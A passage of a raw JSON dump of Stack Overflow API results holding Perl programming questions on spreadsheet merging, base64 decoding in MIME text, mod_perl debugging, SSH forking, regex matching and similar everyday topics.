localtime;\n            };\n            push @files, glob $filename;\n        };\n\n        for my $f (@files) {\n            my $excel = Spreadsheet::ParseExcel::Workbook-&gt;Parse($f);\n            foreach my $sheet (@{$excel-&gt;{Worksheet}}) {\n                if ($sheet-&gt;{Name} !~ /$sheetname/) {\n                    warn \"Skipping '\" . $sheet-&gt;{Name} . \"' (/$sheetname/)\";\n                    next;\n                };\n                $targetname ||= $sheet-&gt;{Name};\n                #warn sprintf \"Copying %s to %s\\n\", $sheet-&gt;{Name}, $targetname;\n\n                my $s = $output-&gt;add_worksheet($targetname);\n                $sheet-&gt;{MaxRow} ||= $sheet-&gt;{MinRow};\n                foreach my $row ($sheet-&gt;{MinRow} .. $sheet-&gt;{MaxRow}) {\n                    my @rowdata = map {\n                        $sheet-&gt;{Cells}-&gt;[$row]-&gt;[$_]-&gt;{Val};\n                    } $sheet-&gt;{MinCol} ..  $sheet-&gt;{MaxCol};\n                    $s-&gt;write($row,0,\\@rowdata);\n                }\n            }\n        };\n    };\n\n    $output-&gt;close;\n</code></pre>\n\n<p>I have 2 excel files named: 2.xls (only 1 sheet named 2 in it), 3.xls (only 1 sheet named 3) </p>\n\n<p>I launched the script as this:</p>\n\n<pre><code>xlsmerge.pl -s -o results-%Y%m%d.xls 2.xls:2 3.xls:3\n</code></pre>\n\n<p>Results: results-20121024.xls  empty nothing in it. </p>\n\n<p>Then I tried </p>\n\n<pre><code>xlsmerge.pl -s -o results-%Y%m%d.xls 2.xls 3.xls \n</code></pre>\n\n<p>And it worked. \nI am not sure why is it failing while adding the Sheetname</p>\n"},{"tags":["xml","regex","perl","base64","mime"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":72,"score":-1,"question_id":13055411,"title":"Base 64 decoding within regular text file","body":"<p>I have a large text file with regular text in it that i am parsing through, however there are sections within it that there are blocks of base64 encoded text. I need to decode this text so it is readable by my parser. I tried using a base64 decoder within my script, but it does not work when i have regular text surrounding the base64 text. Anyone have ideas as to how i can rip out these sections and decode them? The text file is long and will have several of these base64 segments. The only matches around the blocks are the \"X-Attachement-ID: xxx\", the empty line, then block, and the \"--xxx--\" on the line after.</p>\n\n<p>I am using a Perl Script to parse through and read the .txt file.</p>\n\n<p>An example cutout of the textfile is posted below.</p>\n\n<pre><code>Content-Type: text/xml; charset=US-ASCII; name=\"1415160277.xml\"\nContent-Disposition: attachment; filename=\"1415160277.xml\"\nContent-Transfer-Encoding: base64\nX-Attachment-Id: f_h8oq2dh20\n\nPD94bWwgdmVyc2lvbj0iMS4wImVuY29kaW5nPSJVVEYtOCI/Pg0KPEluZnJpbmdlbWVudCB4c2k6\nc2NoZW1hTG9jYXRpb249Imh0dHA6Ly93d3cudGVzdC5jb20vQUNOUyBodHRwOi8vd3d3LnRlc3Qu\nY29tIiB4bWxucz0iaHR0cDovL3d3dy50ZXN0LmNvbS9BQ05TIiB4bWxuczp4c2k9Imh0dHA6Ly93\nd3cudzMub3JnLzIwMDEvWE1MU2NoZW1hLWluc3RhbmNlIj48Q2FzZT48SUQ+MTQxNTE2MDI3Nzwv\nSUQ+PFN0YXR1cz5PcGVuPC9TdGF0dXM+PFNldmVyaXR5Pk5vcm1hbDwvU2V2ZXJpdHk+PC9DYXNl\nPjxDb21wbGFpbmFudD48RW50aXR5PnRlc3Q8L0VudGl0eT48Q29udGFjdD50ZXN0IENvcHlyaWdo\ndCBJbmZyaW5nZW1lbnQ8L0NvbnRhY3Q+PEFkZHJlc3M+PC9BZGRyZXNzPjxQaG9uZT48L1Bob25l\nPjxFbWFpbD50ZXN0QHRlc3QuY29tPC9FbWFpbD48L0NvbXBsYWluYW50PjxTZXJ2aWNlX1Byb3Zp\nZGVyPjxFbnRpdHk+dGVzdDwvRW50aXR5PjxDb250YWN0PnRlc3Q8L0NvbnRhY3Q+PEFkZHJlc3M+\ndGVzdA0KPC9BZGRyZXNzPjxQaG9uZT50ZXN0PC9QaG9uZT48RW1haWw+PC9FbWFpbD48L1NlcnZp\nY2VfUHJvdmlkZXI+PFNvdXJjZT48VGltZVN0YW1wPnRlc3Q8L1RpbWVTdGFtcD48SVBfQWRkcmVz\ncz50ZXN0PC9JUF9BZGRyZXNzPjxUeXBlPkJpdFRvcnJlbnQ8L1R5cGU+PFVzZXJOYW1lPjwvVXNl\nck5hbWU+PE51bWJlcl9GaWxlcz4xPC9OdW1iZXJfRmlsZXM+PC9Tb3VyY2U+PENvbnRlbnQ+PEl0\nZW0+PFRpdGxlPnRlc3Q8L1RpdGxlPjxJbmZvSGFzaD50ZXN0PC9JbmZvSGFzaD48L0l0ZW0+PC9D\nb250ZW50PjxIaXN0b3J5Lz4\n--047d7b5d9603ea951104ccd17c87--',\n            \\'MIME-Version: 1.0\nReceived: by --- with HTTP; Wed, 24 Oct 2012 10:38:10 -0700 (PDT)\nDate: Wed, 24 Oct 2012 10:38:10 -0700\n</code></pre>\n\n<p>The decoding of the base64 block is:</p>\n\n<pre><code>&lt;?xml version=\"1.0\"encoding=\"UTF-8\"?&gt;\n&lt;Infringement xsi:schemaLocation=\"http://www.test.com/ACNS http://www.test.com\"     xmlns=\"http://www.test.com/ACNS\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"&gt;&lt;Case&gt;&lt;ID&gt;1415160277&lt;/ID&gt;&lt;Status&gt;Open&lt;/Status&gt;&lt;Severity&gt;Normal&lt;/Severity&gt;&lt;/Case&gt;&lt;Complainant&gt;&lt;Entity&gt;test&lt;/Entity&gt;&lt;Contact&gt;test Copyright Infringement&lt;/Contact&gt;&lt;Address&gt;&lt;/Address&gt;&lt;Phone&gt;&lt;/Phone&gt;&lt;Email&gt;test@test.com&lt;/Email&gt;&lt;/Complainant&gt;&lt;Service_Provider&gt;&lt;Entity&gt;test&lt;/Entity&gt;&lt;Contact&gt;test&lt;/Contact&gt;&lt;Address&gt;test\n&lt;/Address&gt;&lt;Phone&gt;test&lt;/Phone&gt;&lt;Email&gt;&lt;/Email&gt;&lt;/Service_Provider&gt;&lt;Source&gt;&lt;TimeStamp&gt;test&lt;/TimeStamp&gt;&lt;IP_Address&gt;test&lt;/IP_Address&gt;&lt;Type&gt;BitTorrent&lt;/Type&gt;&lt;UserName&gt;&lt;/UserName&gt;&lt;Number_Files&gt;1&lt;/Number_Files&gt;&lt;/Source&gt;&lt;Content&gt;&lt;Item&gt;&lt;Title&gt;test&lt;/Title&gt;&lt;InfoHash&gt;test&lt;/InfoHash&gt;&lt;/Item&gt;&lt;/Content&gt;&lt;History/&gt;&lt;Notes/&gt;&lt;/Infringement&gt;\n</code></pre>\n"},{"tags":["perl","file","download","carriage-return"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":85,"score":-3,"question_id":13055580,"title":"Perl Issue - File downloaded in windows has a Control M character in it??","body":"<p>For the last few months, we have been facing issues with the Perl script given below.</p>\n\n<p>We have two different versions of Perl over here. \nBelow are the details of the Active Perl versions: Newer Version: (Downloaded file has an error) Active Perl 5.10.0.1005 PPM Version 4.05 </p>\n\n<p>Older Version: (Downloaded file which was correct) Active Perl 5.10.0.1004 PPM Version 4.03 The upstream job that works on the files was working fine with the file downloaded by older version (Active Perl 5.10.0.1004), but fails when uses the file downloaded by newer version (Active Perl 5.10.0.1005) After our troubleshooting, we found out that the file downloaded by newer version come with empty rows between data, since the .csv files came with spaces (empty rows), it is not being processed and fails. It is because perl is generating the output file in unix format which has a control ^M character at the end of each line. so to convert the unix format file to linux format file, i need to use a command call \"unix2dos\" which is not available in windows. I can download the utility and put in system32 but my admin doesnt allow it, he wants me to do everything in Perl. There are many of scripts that fail and the issue is same. This is a Production Issue we had been facing from past 8-9 months. This error came out while we were migrating and testing all the scripts from old server to a new one due to Companyâs Hardware Recycle Policy. We didnât have the Active Perl 5.10.0.1004, so have installed Active Perl 5.10.0.1005 in the new one. Once this issue is solved, we would migrate all the scripts left over in the old one to current production. Can you please help out with this issue I am facing?\n *Code is :\n    use WWW::Mechanize;\n    use Storable;</p>\n\n<pre><code>$DownloadFilePath=\"D:\\\\LI\\\\\";\n$one_day = 60*60*24 ;\nmy($day, $month, $year) = (localtime time+$one_day)[3,4,5];\n$month = sprintf '%02d', $month+1;\n$day   = sprintf '%02d', $day;\n$Datetotal=($year+1900).$month.$day;\n$filedate=join \"\", $Datetotal.\"damlbmp_zone.csv\"; \n$url = join \"\",'http://mis.nyiso.com/public/csv/damlbmp/'.$filedate;\n$m = WWW::Mechanize-&gt;new(autocheck =&gt; 1);\n$m-&gt;get($url);\n$filename=join \"\",$DownloadFilePath.$filedate;\n$m-&gt;save_content($filename);\n</code></pre>\n"},{"tags":["perl","postgresql","dbi"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":44,"score":-1,"question_id":13054954,"title":"Joined table becomes column with DBI Postgres","body":"<p>SO,</p>\n\n<p>I noticed something unexpected. When querying a Postgres DB from Perl via DBI using a statement handle attribute (e.g. <code>$pg_sth-&gt;{NAME_lc}</code>) a column appears in the result set that is the name of the alias given to the table in a join. For example this query:</p>\n\n<pre><code>    SELECT\n      TableAliasA.col1,\n      TableAliasB.col2,\n      TableAliasB.col3\n    FROM tableA TableAliasA\n    LEFT JOIN tableB TableAliasB\n      ON TableAliasA.col1 = TableAliasB.col1\n</code></pre>\n\n<p>will result in an array of <code>col1, col2, TableAliasB, col3</code>.</p>\n\n<p>Why does TableAliasB, and can it be surpressed?</p>\n\n<p>(Note: in the example SQL I have edited the third column in SELECT to be unique.)</p>\n"},{"tags":["perl","apache","logging","log4j","stdout"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":79,"score":1,"question_id":13036438,"title":"redirect perl print statement to apache log","body":"<p>We have a Java web application running on Apache that calls perl scripts in certain use cases. I would like to be able to redirect the print statements of the perl scripts (which are printing to STDOUT by default) to the apache log. \nWhat is the best way to do this?</p>\n"},{"tags":["perl","apache","cgi","mod-perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":13054360,"title":"mod_perl script going in to a tight loop during 'use' processing","body":"<p>I have a rather complex problem to describe. I'm looking for any suggestions for further debugging.</p>\n\n<p>I'm trying to convert to mod_perl from regular cgi. I send an http request to a script that loads up a page, and on that page there are links to load images that are retrieved via further scripts (in other words, the images are loaded via a cgi script, not just a plain link). So when the page loads in the browser, the browser kicks off half a dozen more requests that run scripts to load the images.</p>\n\n<p>The first script (initial page load) runs fine, but sometime after that the apache server goes into a tight loop (very high cpu usage and has to be killed) when processing the image load scripts. Sometimes one of the image load scripts runs fine but a further one loops, sometimes it's the first image load script that loops. strace doesn't show up anything during the loop.</p>\n\n<p>I've started the apache server in single user mode (with -X) and run the interactive perl debugger with trace on to see where the loop starts. I've done this several times, and each time it starts in exactly the same place, during processing of the 'use' statements. I see piles and piles of 'use' and 'require' statements going by, along with other junk, but it always stops at:</p>\n\n<pre><code>Params::Classify::CODE(0x7f43b0b46dd8)(/usr/lib/perl5/Params/Classify.pm:97):\n97:     eval { local $SIG{__DIE__};\nParams::Classify::CODE(0x7f43b0b46dd8)(/usr/lib/perl5/Params/Classify.pm:97):\n97:     eval { local $SIG{__DIE__};\nParams::Classify::CODE(0x7f43b0b46dd8)(/usr/lib/perl5/Params/Classify.pm:98):\n98:             require XSLoader;\nParams::Classify::CODE(0x7f43b0b46dd8)(/usr/lib/perl5/Params/Classify.pm:99):\n99:             XSLoader::load(__PACKAGE__, $VERSION);\nParams::Classify::CODE(0x7f43b0b46dd8)(/usr/lib/perl5/Params/Classify.pm:102):\n102:    if($@ eq \"\") {\nParams::Classify::CODE(0x7f43b0b46dd8)(/usr/lib/perl5/Params/Classify.pm:103):\n103:            close(DATA);\nParams::Classify::CODE(0x7f43b0b46dd8)(/usr/lib/perl5/Params/Classify.pm:130):\n130:    1;\nData::Entropy::CODE(0x7f43b0b46dd8)(/usr/share/perl5/Data/Entropy.pm:46):\n46:     use Params::Classify 0.000 qw(is_ref);\nData::Entropy::CODE(0x7f43b0b46dd8)(/usr/share/perl5/Data/Entropy.pm:46):\n46:     use Params::Classify 0.000 qw(is_ref);\n</code></pre>\n\n<p>This section of 'use' processing is kicked off in my script with:</p>\n\n<pre><code>use Authen::Passphrase::BlowfishCrypt;\n</code></pre>\n\n<p>I've done some searches on Data::Entropy and Params::Classify and didn't find anything useful (which is what I expected - I doubt there is a bug with them).</p>\n\n<p>This has the feel of memory corruption from previous script runs, but I'm not sure yet how to track it down. Since I'm new to mod_perl I thought I'd run it by some experts to see if they've run into something similar or have suggestions on how I can further debug this.</p>\n\n<p>Running apache/2.2.22 mod_perl/2.0.5 perl/5.14.2.</p>\n\n<p>Code is pretty basic, but here it is:</p>\n\n<pre><code>package Wii::Web;\n\nuse strict;\nuse warnings;\n\nuse base qw(Wii);\n\nuse Data::Dumper;\nuse Params::Validate qw(:all);\nuse Log::Log4perl qw(get_logger :easy);\nuse CGI;\nuse Carp qw(cluck);\nuse Email::Valid;\nuse Authen::Passphrase::BlowfishCrypt;\nuse Digest::SHA;\nuse Digest::HMAC;\nuse Time::HiRes qw(gettimeofday tv_interval);\nuse Wii::Web::View;\nuse Wii::Web::Register;\nuse Wii::Web::Login;\nuse Wii::Web::Session;\nuse Wii::Web::User;\nuse Wii::Web::Found;\n\n$CGI::POST_MAX = 1024 * 5000;\n\nBEGIN {\n  $SIG{__DIE__} = \\&amp;sigDie;\n}\n\nsub sigDie {\n  return if $^S; # we are in an eval block\n\n  # assume this is the first print\n  my ($error) = @_;\n  print \"Status: 500\\n\";\n  print \"Content-type: text/html\\n\\n\";\n  print \"&lt;html&gt;&lt;body&gt;\\n\";\n  print \"&lt;h3&gt;Whoops there was an error!&lt;/h3&gt;\\n\";\n  print \"&lt;!-- $error  --&gt;\\n\";\n  print \"Please try again later&lt;br /&gt;\\n\";\n  print \"&lt;b&gt;$error&lt;/b&gt;\\n\";\n  print \"&lt;/body&gt;&lt;/html&gt;\\n\";\n\n  Wii::sigDie(@_);\n\n  return 1;\n}\n&lt;snip&gt;\n</code></pre>\n\n<p>There are other modules involved before this one, but this is the one that kicks off the problem.</p>\n"},{"tags":["regex","perl","variables","input","expressions"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":102,"score":0,"question_id":13052001,"title":"Perl Regular expression match from user input","body":"<p>I'm just learning perl and I'm trying to learn regular expressions at the same time. Basically I'm trying to open a log file and print out any lines that match user input to a new file. Using the following code I get no output at all if I type in the word \"Clinton\". But if I replace</p>\n\n<pre><code>print MYFILE if /\\$string\\;\n</code></pre>\n\n<p>with</p>\n\n<pre><code>print MYFILE if /\\Clinton\\; \n</code></pre>\n\n<p>it runs as expected. Any ideas? I know it is something simple that I am missing.</p>\n\n<pre><code>print \"Enter a word to look up: \";\n$string = &lt;&gt;;\nprint \"You put $string\";\nopen(LOG,\"u_ex121011.log\") or die \"Unable to open logfile:$!\\n\";\nopen (MYFILE, '&gt;&gt;data2.txt');\nwhile(&lt;LOG&gt;){   \n   print MYFILE if /\\Q($string)\\E/;\n}\nclose (MYFILE); \nclose(LOG);\nprint \"Check data2.txt\";\n</code></pre>\n"},{"tags":["perl","fork","perl-module"],"answer_count":2,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":140,"score":2,"question_id":13018741,"title":"Perl Script cannot fork more than 10 times","body":"<p>My perl code does not allow more than 10 forks. For the following perl code, whenever I use more than 10 machines in the list of machines read in to the script, the perl script only forks 10 processes for 10 machines and for the rest it dies with error:</p>\n\n<p>SSHProcessError The ssh process was terminated. at serverLogin.pl 44\nIt dies at the line where it says $ssh->waitfor('The authenticity of host*',15);.</p>\n\n<p>PERL SCRIPT:</p>\n\n<pre><code>#!/usr/bin/perl -w\n\nuse Net::SSH::Expect;\nuse Term::ReadKey;\n\n\nprint \"please enter filename:\\n\";\n$filename = ReadLine;\nchomp $filename;\n\nprint \"please enter user ID:\\n\";\n$userID = ReadLine;\nchomp $userID;\n\nprint \"please enter password:\\n\";\nReadMode 'noecho';\n$passwordforuser = ReadLine 0;\nchomp $passwordforuser;\nReadMode 'normal';\n\nopen READFILE,\"&lt;\",\"$filename\" or die \"Could not open file listofmachines\\n\";\n\nmy @listofmachines = &lt;READFILE&gt;;\n\nforeach $machine (@listofmachines)\n{\n    my $pid=fork();\n\n    if ($pid){\n        push(@childprocs,$pid);\n    }\n    elsif ( $pid == 0 ) {\n        my $ssh = Net::SSH::Expect-&gt;new (\n            host =&gt; \"$machine\",\n            user =&gt; \"$userID\",\n            password=&gt; \"$passwordforuser\",\n            timeout =&gt; 25,\n            raw_pty =&gt; 1,\n        );\n\n        my $login_output = $ssh-&gt;run_ssh or die \"Could not launch SSH\\n\";\n\n        $ssh-&gt;waitfor('The authenticity of host*',15);\n\n        #print \"This output for machine $machine\\n\";\n\n        $ssh-&gt;send(\"yes\");\n        $ssh-&gt;waitfor('password: ', 15);\n        $ssh-&gt;send(\"$passwordforuser\");\n        $ssh-&gt;waitfor('$ ', 10);\n        my @commresult=$ssh-&gt;exec(\"uptime\");\n\n        print $login_output;\n        print @commresult;\n\n        exit 0;\n    }\n    else {\n        die \"Could not Fork()\\n\";\n    }\n}\n\nforeach(@childprocs){\n    waitpid($_, 0)\n}\n</code></pre>\n\n<p>Please help. Thanks, nblu.</p>\n"},{"tags":["regex","perl","vms"],"answer_count":8,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":135,"score":2,"question_id":12678519,"title":"How can I disable variable interpolation with the Perl substitution operator?","body":"<p>I'm trying to replace a particular line in a text file on VMS.  Normally, this is a simple one-liner with Perl.  But I ran into a problem when the replacement side was a symbol containing a VMS path.  Here is the file and what I tried:</p>\n\n<p>Contents of file1.txt:</p>\n\n<pre><code>foo\nbar\nbaz\nquux\n</code></pre>\n\n<p>Attempt to substitute 3rd line:</p>\n\n<pre><code>$ mysub = \"disk$data1:[path.to]file.txt\"\n$ perl -pe \"s/baz/''mysub'/\" file1.txt\n</code></pre>\n\n<p>Yields the following output:</p>\n\n<pre><code>foo\nbar\ndisk:[path.to]file.txt\nquux\n</code></pre>\n\n<p>It looks like Perl was overeager and replaced the <code>$data1</code> part of the path with the contents of a non-existent variable (i.e., nothing).  Running with the debugger confirmed that.  I didn't supply <code>/e</code>, so I thought Perl should just replace the text as-is.  Is there a way to get Perl to do that?</p>\n\n<p>(Also note that I can reproduce similar behavior at the linux command line.)</p>\n"},{"tags":["perl","redis","cpan","sortedset"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":39,"score":1,"question_id":13048438,"title":"Redis Perl Library: how to use sorted sets?","body":"<p>I have a data structure in <code>redis</code> that uses sorted sets for a \"top items\" system that I plan to use on my webpage. I am basically using the <code>redis-cli</code> commands like <a href=\"http://redis.io/commands/zrange\" rel=\"nofollow\"><code>ZRANGE</code></a> to get my top items out of redis.</p>\n\n<p>Now I want to access this data programmatically in Perl. I have seen the <a href=\"http://search.cpan.org/dist/Redis/lib/Redis.pm\" rel=\"nofollow\">Redis.pm library</a>, but I could not find any signs of these <code>Z*</code> methods there. </p>\n\n<p>Can I use the Redis.pm library to work with sorted sets in redis or do I have to use another library?</p>\n"},{"tags":["xml","perl","parsing","xml-simple"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":3528,"score":1,"question_id":5725374,"title":"how to parse a simple xml file to a readable format","body":"<p>Perl newbie here. Can someone kindly show me how to use perl to extract data from this xml file and format the output anyway i would need? Would I use XML::Simple or open this as a fh and split it somehow? thank you.</p>\n\n<p>Documentation for using <a href=\"http://search.cpan.org/~grantm/XML-Simple-2.18/lib/XML/Simple.pm\" rel=\"nofollow\">XML::Simple</a> doesn't seem simple to me.</p>\n\n<p>For example I have a small xml file that looks like this.</p>\n\n<p>test.xml</p>\n\n<pre><code>&lt;?xml version=\"1.5\" encoding=\"UTF-8\"?&gt;&lt;org.apache.Content duration=\"277135\" count=\"51\" numDirs=\"50\" bytesUsed=\"110133451\"/&gt;\n</code></pre>\n\n<p>I would like to convert attribute=\"value\" pairs to be readable like csv file, <code>:</code>  or however, i want to print it out.</p>\n\n<p>Ex:</p>\n\n<pre><code>duration:277135 count:51 numDirs:50 bytesUsed:110133451\n</code></pre>\n"},{"tags":["regex","perl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":78,"score":1,"question_id":13050558,"title":"Grabbing first and last field with regex delimeter using perl one-liner","body":"<p>I need to parse a file and grab certain fields from it using a regular expression as part of the delimiter.  I thought I can use perl to do this(?).  The problem is I can't get it to work properly.  Here's a one liner which I thought would allow me to print fields that are separated by one more white spaces (in this case one or more space):</p>\n\n<pre><code>bash_prompt&gt; perl -anF'/ +/' -e 'print \"$F[0], $F[-1]\\n\"' build_outputfile\n</code></pre>\n\n<p>The output file is from a makefile.</p>\n\n<p>Here, I want to print out the first token, and the last token.  So in my case which compiler was used and which file was compiled.  Perhaps there's a better way to do it, but now I'm bothered as to why my perl one liner does not work.</p>\n\n<p>Anyways,  the regular expression '/ +/ does not appear to work.  I get some unexpected output.  Perhaps F does not actually want a regular expression?  When I replace F's argument  with '/ /' that contains one space, I still don't get a expected output.</p>\n\n<p>Can anyone help?  Thanks.</p>\n\n<p>Here's some test code for you to try.  Save it in a file:</p>\n\n<pre><code>g++ -c  -g  -Wall -I/codedir/src/CanComm/include -I/home/codemonkey/workspace/thirdparty/Boost -Wno-deprecated SCMain.cpp\ng++ -c -g  -Wall -I./object/include -I./wrapper/include -I./Properties/include -I./Messaging/include -I/codedir/src/Logging/sclog/include ./object/SCObject.cpp ./object/RandNumGenerator.cpp ./object/ScannerConstraints.cpp ./object/ThreadSync.cpp ./object/SCData.cpp ./object/AirScanData.cpp ./object/ClusterData.cpp ./object/WarmupData.cpp ./object/SCCommand.cpp ./object/ScanCommands.cpp ./object/RCCommands.cpp ./object/ReconData.cpp ./object/UICommTool.cpp ./object/UIMsg.cpp ./object/UI2SCConversion.cpp ./object/RCMsg.cpp ./object/RCMessageInfo.cpp ./object/Utils.cpp ./object/ZBackupTable.cpp ./object/ZBackupFactory.cpp\ng++ -c -g  -Wall -I./Properties/include -I/codedir/src/Logging/sclog/include -I./object/include -I/home/codemonkey/workspace/thirdparty/Boost  ./Properties/PropertyMap.cpp\n</code></pre>\n"},{"tags":["perl","cgi","mod-perl","mod-perl2"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":13038102,"title":"Serving up images under mod_perl using file::copy fails","body":"<p>I have a CGI script that serves up images using the File::Copy CPAN module:</p>\n\n<pre><code>use File::Copy;\n.... (set appropriate content header)\nbinmode STDOUT;\ncopy $imageFile, \\*STDOUT || die \"Image delivery failed: $!\";\n</code></pre>\n\n<p>This works fine under CGI but when run under mod_perl I get:</p>\n\n<pre><code>[File::Copy::copy 140]  stat() on unopened filehandle STDOUT at /usr/share/perl/5.14/File/Copy.pm line 140.\n</code></pre>\n\n<p>I'm not sure if this is expected behaviour or if there's a bug somewhere. I'm new to mod_perl and find I am drowning in a sea of documentation at the moment. Is there any way to change my script so it runs fine under CGI or mod_perl without changes?</p>\n"},{"tags":["perl","windows-xp","client","memcached"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":420,"score":4,"question_id":2196568,"title":"Is there a Perl memcached client that works on Windows XP?","body":"<p>I'm trying to find an alternative to the <a href=\"http://search.cpan.org/dist/Cache-Memcached\" rel=\"nofollow\">Cache::Memcached</a> Perl module that works with Windows XP. Or, to somehow get Cache::Memcached working on Windows XP. </p>\n\n<p>A bit of background: the production environtment (web server) is Solaris 10, which I've already installed memcached and Cache::Memcached, and all works fine. However, the development PC is Windows XP, and Cache::Memcached won't install properly, and definitely doesn't work. See:</p>\n\n<p><a href=\"http://www.cpantesters.org/distro/C/Cache-Memcached.html\" rel=\"nofollow\">cpantesters.org report on Cache::Memcached</a></p>\n\n<p><a href=\"http://www.cpantesters.org/cpan/report/6679085\" rel=\"nofollow\">same error that I receive</a></p>\n\n<p>Perl version: This is perl, v5.10.1 built for MSWin32-x86-multi-thread</p>\n\n<p>Note: Changing the development environment to Unix / Linux is not an option at this point. Would consider other Perl based caching options suitable for a web environment. </p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":73,"score":0,"question_id":10218876,"title":"Are there dangers to specifying the package name when making a local subroutine call?","body":"<p>I've inherited Perl code similar to what I have shown below.  Package contains common subroutines and does not import nor export namespace.  This calling convention seems atypical.  Refactoring is an option.</p>\n\n<p>I'm interested in understanding the risks/side effects of explicitly naming the package when calling a subroutine within the current package.  Thanks in advance.</p>\n\n<pre><code>package Util;\nsub _step1 {\n    # &lt;code&gt;\n}\nsub _step2 {\n    # &lt;code&gt;\n}\nsub doWork {\n   Util::_step1();\n   Util::_step2();\n}\n1;\n</code></pre>\n"}]}
{"total":22324,"page":6,"pagesize":100,"questions":[{"tags":["perl","unit-testing","code-coverage"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":58,"score":2,"question_id":9934816,"title":"Can I include an argument within a code reference when calling Test::Output::stdout_like()","body":"<p>I'm writing unit tests using Test::More and Test::Output.  I use Test::More to validate the return values and I plan to use Test::Output to validate the stdout produced by my subroutines. </p>\n\n<p>I am attempting to write test cases for a subroutine whose stdout is dependent on the arguments sent. Test::Output::stdout_like(code reference, regexp, test description) looks to have the functionality I want, however I am struggling to construct a code reference which contains an argument.  </p>\n\n<p>I presume this is a common practice within Perl unit testing scripts.  Can anyone offer an example?   </p>\n\n<p>Side note, thanks to Kurt W. Leucht for his Perl unit testing introduction: <a href=\"http://stackoverflow.com/questions/533553/perl-build-unit-testing-code-coverage-a-complete-working-example\">Perl build, unit testing, code coverage: A complete working example</a></p>\n"},{"tags":["perl","parsing"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":108,"score":0,"question_id":13045108,"title":"How to parse through tab-delimited file in perl?","body":"<p>I'm new to Perl, and I've hit a mental roadblock. I need to extract information from a tab delimited file as shown below.</p>\n\n<pre><code>#name  years risk total\n adam  5     100  200\n adam  5     50   100\n adam  10    20   300\n bill  20    5    100\n bill  30    10   800\n</code></pre>\n\n<p>In this example, the tab delimited file shows length of investment, amount of money risked, and total at the end of investment. </p>\n\n<p>I want to parse through this file, and for each name (e.g. <strong>adam</strong>), calculate sum of years invested <strong>5+5</strong>, and calculate sum of earnings <strong>(200-100) + (100-50) + (300-20)</strong>. I also would like to save the totals for each name (200, 100, 300). </p>\n\n<p>Here's what I have tried so far:</p>\n\n<pre><code>my $filename;\nmy $seq_fh;\n\nopen $seq_fh, $frhitoutput \n    or die \"failed to read input file: $!\";\n\nwhile (my $line = &lt;$seq_fh&gt;) {\n\n    chomp $line;\n    ## skip comments and blank lines and optional repeat of title line\n\n    next if $line =~ /^\\#/ || $line =~ /^\\s*$/ || $line =~ /^\\+/;\n\n    #split each line into array\n    my @line = split(/\\s+/, $line);\n    my $yeartotal = 0;\n    my $earning   = 0;\n\n    #$line[0] = name\n    #$line[1] = years\n    #$line[2] = start\n    #$line[3] = end\n\n    while (@line[0]){\n\n        $yeartotal += $line[1];\n        $earning   += ($line[3]-$line[2]);\n    }\n}\n</code></pre>\n\n<p>Any ideas of where I went wrong?</p>\n"},{"tags":["html","perl","email","iis","formmail"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":103,"score":0,"question_id":13047103,"title":"IIS 405 HTTP verb used to access this page is not allowed email","body":"<p>First off, I'm familiar with IIS however do not have much practical experience, hence why I have come here.</p>\n\n<p>I have setup IIS7 and put my HTML website, scripts etc into the wwwroot folder. I'm able to browse the website locally just for testing purposes.</p>\n\n<p>I have a webpage with a simple email form which uses Matt's Script Archive: FormMail.pl. Upon submission, I run into this error:</p>\n\n<pre><code> 405 - HTTP verb used to access this page is not allowed.\n The page you are looking for cannot be displayed because an invalid method (HTTP verb) was used to attempt access.\n</code></pre>\n\n<p>I'm not sure about this error or how to resolve it so the email form works.</p>\n\n<p>If you need any additional information regarding this problem, I'll provide as much info as possible.</p>\n\n<p>Thanks :)</p>\n\n<p>Update:</p>\n\n<p>Ok, so I have modified my HTML to use the nms script. In IIS I had to enable CGI and ISAPI as they weren't installed. Once they were installed I added a Script Handler Mapping for *.pl, *cgi; also added the Verbs GET, HEAD, and POST to both of the Handler Mappings. I than used:</p>\n\n<pre><code> &lt;!DOCTYPE htmlPUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt;\n &lt;html xmlns=\"http://www.w3.org/1999/xhtml\" lang=\"en-US\" xml:lang=\"en-US\"&gt;\n &lt;head&gt;\n &lt;title&gt;Perl Test&lt;/title&gt;\n &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\" /&gt;\n &lt;/head&gt;\n &lt;body&gt;\n &lt;h1&gt;Perl is working!&lt;/h1&gt;\n &lt;/body&gt;\n &lt;/html&gt;\n</code></pre>\n\n<p>To test if the *.pl and *.cgi is working on the localhost. </p>\n\n<p>Now comes the part where I'm stuck...</p>\n\n<p>When I click on the submit button it directs me to the formmail.cgi (formmail.pl doesn't work for some reason) however it only directs me to the cgi script, and a blank, white page.</p>\n"},{"tags":["perl"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":73,"score":0,"question_id":13049731,"title":"Perl - Add a line in the beginning of a file without replacing the original first line","body":"<p>Could you tell me what to correct in the following code, so that it does not replace the first line of my file, with the newline I am telling to 